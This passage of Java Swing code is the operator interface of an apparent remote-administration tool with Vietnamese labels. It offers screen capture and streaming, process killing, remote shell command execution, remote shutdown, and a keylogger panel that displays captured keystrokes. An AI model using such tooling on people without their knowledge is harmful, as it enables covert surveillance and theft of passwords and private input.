            screenshotLabel = new JLabel("Nhấn 'Chụp màn hình' để bắt đầu");
            screenshotLabel.setHorizontalAlignment(JLabel.CENTER);
            JScrollPane scrollPane = new JScrollPane(screenshotLabel);
            panel.add(scrollPane, BorderLayout.CENTER);

            JPanel controlPanel = new JPanel();
            JButton screenshotButton = new JButton("Chụp màn hình");
            screenshotButton.addActionListener(e -> requestScreenshot(userId));
            controlPanel.add(screenshotButton);

            streamButton = new JToggleButton("Bắt đầu stream màn hình");
            streamButton.addActionListener(e -> {
                //Kiểm tra xem nếu như stream màn vẫn còn thì tiến hành tắt đi
                if (screenStreamActive) {
                    streamButton.setText("Dừng stream màn hình");
                }

                screenStreamActive = streamButton.isSelected();
                toggleScreenStream(userId, screenStreamActive);
                streamButton.setText(screenStreamActive ? "Dừng stream màn hình" : "Bắt đầu stream màn hình");
            });

            controlPanel.add(streamButton);

            panel.add(controlPanel, BorderLayout.SOUTH);

            return panel;
        }

        private JPanel createProcessesPanel() {
            JPanel panel = new JPanel(new BorderLayout());
            panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

            // Add search panel
            JPanel searchPanel = new JPanel(new BorderLayout());
            JTextField searchField = new JTextField();
            searchPanel.add(new JLabel("Tìm kiếm: "), BorderLayout.WEST);
            searchPanel.add(searchField, BorderLayout.CENTER);
            panel.add(searchPanel, BorderLayout.NORTH);

            // Create table model with columns
            String[] columns = {"PID", "Tên tiến trình", "CPU", "RAM", "User", "Priority"};
            processTableModel = new DefaultTableModel(columns, 0) {
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };

            processTable = new JTable(processTableModel);
            processTable.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            processTable.getTableHeader().setReorderingAllowed(false);

            // Add table sorter and filter
            TableRowSorter<DefaultTableModel> sorter = new TableRowSorter<>(processTableModel);
            processTable.setRowSorter(sorter);

            // Connect search field to filter
            searchField.getDocument().addDocumentListener(new DocumentListener() {
                @Override
                public void insertUpdate(DocumentEvent e) {
                    filterProcesses(searchField.getText(), sorter);
                }

                @Override
                public void removeUpdate(DocumentEvent e) {
                    filterProcesses(searchField.getText(), sorter);
                }

                @Override
                public void changedUpdate(DocumentEvent e) {
                    filterProcesses(searchField.getText(), sorter);
                }
            });

            JScrollPane scrollPane = new JScrollPane(processTable);
            panel.add(scrollPane, BorderLayout.CENTER);

            JPanel controlPanel = new JPanel();
            JButton refreshButton = new JButton("Làm mới");
            refreshButton.addActionListener(e -> requestProcessList(userId));
            controlPanel.add(refreshButton);

            JButton killButton = new JButton("Kết thúc tiến trình");
            killButton.addActionListener(e -> {
                int selectedRow = processTable.getSelectedRow();
                if (selectedRow >= 0) {
                    selectedRow = processTable.convertRowIndexToModel(selectedRow);
                    int pid = Integer.parseInt(processTableModel.getValueAt(selectedRow, 0).toString());
                    int result = JOptionPane.showConfirmDialog(
                            panel,
                            "Bạn có chắc muốn kết thúc tiến trình " + pid + "?",
                            "Xác nhận kết thúc tiến trình",
                            JOptionPane.YES_NO_OPTION
                    );
                    if (result == JOptionPane.YES_OPTION) {
                        killProcess(userId, pid);
                    }
                } else {
                    JOptionPane.showMessageDialog(panel, "Vui lòng chọn một tiến trình để kết thúc");
                }
            });
            controlPanel.add(killButton);

            panel.add(controlPanel, BorderLayout.SOUTH);

            return panel;
        }

        private void filterProcesses(String text, TableRowSorter<DefaultTableModel> sorter) {
            if (text.trim().length() == 0) {
                sorter.setRowFilter(null);
            } else {
                try {
                    sorter.setRowFilter(RowFilter.regexFilter("(?i)" + text));
                } catch (PatternSyntaxException e) {
                    // Invalid regex, use plain text matching
                    sorter.setRowFilter(RowFilter.regexFilter("\\Q" + text + "\\E", 1));
                }
            }
        }

        private JPanel createCommandsPanel() {
            JPanel panel = new JPanel(new BorderLayout());
            panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

            // Command history dropdown
            commandHistoryModel = new DefaultComboBoxModel<>();
            JComboBox<String> historyCombo = new JComboBox<>(commandHistoryModel);
            historyCombo.setEditable(false);
            historyCombo.addActionListener(e -> {
                String selectedCmd = (String) historyCombo.getSelectedItem();
                if (selectedCmd != null) {
                    cmdField.setText(selectedCmd);
                }
            });

            JPanel historyPanel = new JPanel(new BorderLayout());
            historyPanel.add(new JLabel("Lịch sử: "), BorderLayout.WEST);
            historyPanel.add(historyCombo, BorderLayout.CENTER);

            // Command input
            JPanel inputPanel = new JPanel(new BorderLayout());
            JLabel cmdLabel = new JLabel("Lệnh:");
            cmdField = new JTextField(); // Sử dụng biến đã khai báo ở cấp lớp
            JButton executeButton = new JButton("Thực thi");

            inputPanel.add(cmdLabel, BorderLayout.WEST);
            inputPanel.add(cmdField, BorderLayout.CENTER);
            inputPanel.add(executeButton, BorderLayout.EAST);

            JPanel topPanel = new JPanel(new BorderLayout());
            topPanel.add(historyPanel, BorderLayout.NORTH);
            topPanel.add(inputPanel, BorderLayout.CENTER);

            commandOutputText = new JTextArea();
            commandOutputText.setEditable(false);
            commandOutputText.setFont(new Font("Monospaced", Font.PLAIN, 12));
            JScrollPane scrollPane = new JScrollPane(commandOutputText);

            executeButton.addActionListener(e -> {
                String command = cmdField.getText().trim();
                if (!command.isEmpty()) {
                    executeCommand(userId, command);
                    commandOutputText.append("> " + command + "\n");

                    // Add to history if not duplicate
                    boolean exists = false;
                    for (int i = 0; i < commandHistoryModel.getSize(); i++) {
                        if (commandHistoryModel.getElementAt(i).equals(command)) {
                            exists = true;
                            break;
                        }
                    }

                    if (!exists) {
                        commandHistoryModel.insertElementAt(command, 0);
                        if (commandHistoryModel.getSize() > 20) { // Limit to 20 commands
                            commandHistoryModel.removeElementAt(commandHistoryModel.getSize() - 1);
                        }
                    }

                    cmdField.setText("");
                }
            });

            // Handle Enter key
            cmdField.addKeyListener(new KeyAdapter() {
                @Override
                public void keyPressed(KeyEvent e) {
                    if (e.getKeyCode() == KeyEvent.VK_ENTER) {
                        executeButton.doClick();
                    }
                }
            });

            panel.add(topPanel, BorderLayout.NORTH);
            panel.add(scrollPane, BorderLayout.CENTER);

            // Add clear button
            JPanel bottomPanel = new JPanel(new FlowLayout(FlowLayout.RIGHT));
            JButton clearButton = new JButton("Xóa màn hình");
            clearButton.addActionListener(e -> commandOutputText.setText(""));
            bottomPanel.add(clearButton);
            panel.add(bottomPanel, BorderLayout.SOUTH);

            return panel;
        }

        private JToggleButton keyloggerButton;

        public JToggleButton getKeloggerButton() {
            return keyloggerButton;
        }

        private JPanel createKeylogPanel() {
            JPanel panel = new JPanel(new BorderLayout());
            panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

            keylogText = new JTextArea();
            keylogText.setEditable(false);
            keylogText.setFont(new Font("Monospaced", Font.PLAIN, 12));
            JScrollPane scrollPane = new JScrollPane(keylogText);
            panel.add(scrollPane, BorderLayout.CENTER);

            JPanel controlPanel = new JPanel();
            keyloggerButton = new JToggleButton("Bắt đầu ghi phím");
            keyloggerButton.addActionListener(e -> {
                keyloggerActive = keyloggerButton.isSelected();
                toggleKeyLogger(userId, keyloggerActive);
                keyloggerButton.setText(keyloggerActive ? "Dừng ghi phím" : "Bắt đầu ghi phím");
            });
            controlPanel.add(keyloggerButton);

            JButton clearButton = new JButton("Xóa màn hình");
            clearButton.addActionListener(e -> keylogText.setText(""));
            controlPanel.add(clearButton);

            panel.add(controlPanel, BorderLayout.SOUTH);

            return panel;
        }

        private JPanel createControlPanel() {
            JPanel panel = new JPanel();
            panel.setBorder(BorderFactory.createTitledBorder("Điều khiển"));

            JButton logoutButton = new JButton("Đăng xuất user");
            logoutButton.addActionListener(e -> {
                int result = JOptionPane.showConfirmDialog(
                        this,
                        "Bạn có chắc muốn đăng xuất user " + userId + "?",
                        "Xác nhận đăng xuất",
                        JOptionPane.YES_NO_OPTION
                );
                if (result == JOptionPane.YES_OPTION) {
                    logoutUser(userId);
                }
            });
            panel.add(logoutButton);

            JButton shutdownButton = new JButton("Tắt máy");
            shutdownButton.addActionListener(e -> {
                int result = JOptionPane.showConfirmDialog(
                        this,
                        "Bạn có chắc muốn tắt máy " + userId + "?",
                        "Xác nhận tắt máy",
                        JOptionPane.YES_NO_OPTION
                );
                if (result == JOptionPane.YES_OPTION) {
                    shutdownUser(userId);
                }
            });
            panel.add(shutdownButton);

            autoRefreshCheckbox = new JCheckBox("Tự động làm mới (5s)");
            autoRefreshCheckbox.setSelected(true);
            autoRefreshCheckbox.addActionListener(e -> {
                if (autoRefreshCheckbox.isSelected()) {
                    startAutoRefresh();
                } else {
                    stopAutoRefresh();
                }
            });
            panel.add(autoRefreshCheckbox);

            return panel;
        }

        private void startAutoRefresh() {
            try {
                if (autoRefresh.isShutdown()) {
                    autoRefresh = Executors.newScheduledThreadPool(1);
                }

                autoRefresh.scheduleAtFixedRate(() -> {
                    if (!isShutdown && !isLoggedOut) {
                        requestSystemInfo(userId);
                    }
                }, 5, 5, TimeUnit.SECONDS);
            } catch (Exception e) {
                System.err.println("Error starting auto-refresh: " + e.getMessage());
            }
        }

        private void stopAutoRefresh() {
            try {
                if (autoRefresh != null && !autoRefresh.isShutdown()) {
                    autoRefresh.shutdown();
                    try {
                        autoRefresh.awaitTermination(2, TimeUnit.SECONDS);
                    } catch (InterruptedException e) {
                        autoRefresh.shutdownNow();
                    }
                }
            } catch (Exception e) {
                System.err.println("Error stopping auto-refresh: " + e.getMessage());
            }
        }

        public void cleanup() {
            // Stop auto refresh
            stopAutoRefresh();

            // Stop screen streaming if active
            if (screenStreamActive) {
                screenStreamActive = false;
            }

            // Stop keylogger if active
            if (keyloggerActive) {
                keyloggerActive = false;
            }

            // Clear image resources
            if (screenshotLabel != null && screenshotLabel.getIcon() != null) {
                screenshotLabel.setIcon(null);
                screenshotLabel.setText("User đã ngắt kết nối");
            }
        }

        public void indicateShutdown() {
            isShutdown = true;
            if (autoRefreshCheckbox != null) {
                autoRefreshCheckbox.setSelected(false);
                autoRefreshCheckbox.setEnabled(false);
            }
            stopAutoRefresh();
            systemInfoPane.setText("Máy tính đang tắt...");
        }

        public void indicateLogout() {
            isLoggedOut = true;
            if (autoRefreshCheckbox != null) {
                autoRefreshCheckbox.setSelected(false);
                autoRefreshCheckbox.setEnabled(false);
            }
            stopAutoRefresh();
            systemInfoPane.setText("User đang đăng xuất...");
        }

        public void updateSystemInfo(JSONObject data) {
            try {
                StringBuilder info = new StringBuilder();
                info.append("Thông Tin Máy: ").append(userId).append("\n\n");

                // OS info
                info.append("Hệ điều hành: ").append(data.getString("osName")).append(" ");
                info.append(data.getString("osVersion")).append("\n\n");

                // CPU info
                info.append("CPU: ").append(data.getString("cpuModel")).append("\n");
                info.append("Cores: ").append(data.getInt("cpuCores")).append("\n");
                info.append("CPU Usage: ").append(data.getString("cpuLoad")).append("%\n\n");

                // Memory info
                info.append("Tổng RAM: ").append(data.getString("totalMemory").split(" - ")[0]).append("\n");
                info.append("RAM đã dùng: ").append(data.getString("usedMemory").split(" - ")[0]).append("\n");
                info.append("Mức sử dụng RAM: ").append(data.getString("memoryUsage")).append("%\n\n");

                // Disk info
                info.append("Ổ đĩa:\n");
                JSONArray disks = data.getJSONArray("disks");
                for (int i = 0; i < disks.length(); i++) {
                    JSONObject disk = disks.getJSONObject(i);
                    String name = disk.getString("name");
                    String size = disk.getString("size").split(" - ")[0];
                    String free = disk.getString("free").split(" - ")[0];

                    info.append(name).append("\n");
                    info.append("  Tổng dung lượng: ").append(size).append("\n");
                    info.append("  Còn trống: ").append(free).append("\n");
                }

                systemInfoPane.setText(info.toString());
                systemInfoPane.setCaretPosition(0);
            } catch (JSONException e) {
                System.err.println("Error updating system info panel: " + e.getMessage());
            }
        }

        public void updateScreenshot(JSONObject data) {
            try {
                String base64Image = data.getString("imageData");
                byte[] imageBytes = Base64.getDecoder().decode(base64Image);

                BufferedImage image = ImageIO.read(new ByteArrayInputStream(imageBytes));
                ImageIcon icon = new ImageIcon(image);

                // Scale image if needed
                int maxWidth = screenshotPanel.getWidth() - 30;
                int maxHeight = screenshotPanel.getHeight() - 100;

                if (icon.getIconWidth() > maxWidth || icon.getIconHeight() > maxHeight) {
                    double scale = Math.min(
                            (double) maxWidth / icon.getIconWidth(),
                            (double) maxHeight / icon.getIconHeight()
                    );
                    int newWidth = (int) (icon.getIconWidth() * scale);
                    int newHeight = (int) (icon.getIconHeight() * scale);

                    Image scaledImage = image.getScaledInstance(newWidth, newHeight, Image.SCALE_SMOOTH);
                    icon = new ImageIcon(scaledImage);
                }

                screenshotLabel.setIcon(icon);
                screenshotLabel.setText(null);

            } catch (IOException | JSONException e) {
                System.err.println("Error updating screenshot: " + e.getMessage());
                screenshotLabel.setIcon(null);
                screenshotLabel.setText("Lỗi hiển thị ảnh: " + e.getMessage());
            }
        }

        public void updateProcessList(JSONObject data) {
            try {
                // Save selection
                int selectedRow = processTable.getSelectedRow();
                int selectedPid = -1;
                if (selectedRow >= 0) {
                    selectedRow = processTable.convertRowIndexToModel(selectedRow);
                    selectedPid = Integer.parseInt(processTableModel.getValueAt(selectedRow, 0).toString());
                }

                // Clear existing rows
                processTableModel.setRowCount(0);

                JSONArray processes = data.getJSONArray("processes");
                for (int i = 0; i < processes.length(); i++) {
                    JSONObject process = processes.getJSONObject(i);
                    Object[] row = new Object[6];
                    row[0] = process.getInt("pid");
                    row[1] = process.getString("name");
                    row[2] = process.getString("cpuUsage");
                    row[3] = process.getString("memoryUsage");
                    row[4] = process.getString("user");
                    row[5] = process.getString("priority");
                    processTableModel.addRow(row);
                }

                // Restore selection if possible
                if (selectedPid >= 0) {
                    for (int i = 0; i < processTableModel.getRowCount(); i++) {
                        if (Integer.parseInt(processTableModel.getValueAt(i, 0).toString()) == selectedPid) {
                            int viewRow = processTable.convertRowIndexToView(i);
                            processTable.setRowSelectionInterval(viewRow, viewRow);
                            break;
                        }
                    }
                }
            } catch (JSONException e) {
                System.err.println("Error updating process list: " + e.getMessage());
            }
        }

        public void handleCommandResponse(JSONObject data) {
            try {
                String command = data.getString("command");

                if (command.equals("killProcess")) {
                    boolean success = data.getBoolean("success");
                    int pid = data.getInt("pid");

                    commandOutputText.append("Tiến trình " + pid + " " +
                            (success ? "đã bị kết thúc thành công" : "không thể kết thúc") + "\n");

                    if (success) {
                        // Refresh process list
                        requestProcessList(userId);
                    }
                } else {
                    // Normal command output
                    if (data.has("output")) {
                        commandOutputText.append(data.getString("output"));
                    }

                    if (data.has("error") && !data.getString("error").isEmpty()) {
                        commandOutputText.append("Lỗi: " + data.getString("error"));
                    }

                    if (data.has("exitCode")) {
                        commandOutputText.append("Mã thoát: " + data.getInt("exitCode") + "\n");
                    }
                }

                // Scroll to bottom
                commandOutputText.setCaretPosition(commandOutputText.getDocument().getLength());
            } catch (JSONException e) {
                System.err.println("Error handling command response: " + e.getMessage());
            }
        }

        public void updateKeylogData(JSONObject data) {
            try {
                String keyData = data.getString("data");
                long timestamp = data.getLong("timestamp");
                Date time = new Date(timestamp);

                keylogText.append("[" + time + "] " + keyData + "\n");
                keylogText.setCaretPosition(keylogText.getDocument().getLength());
            } catch (JSONException e) {
                System.err.println("Error updating keylog data: " + e.getMessage());
            }
        }
    }
}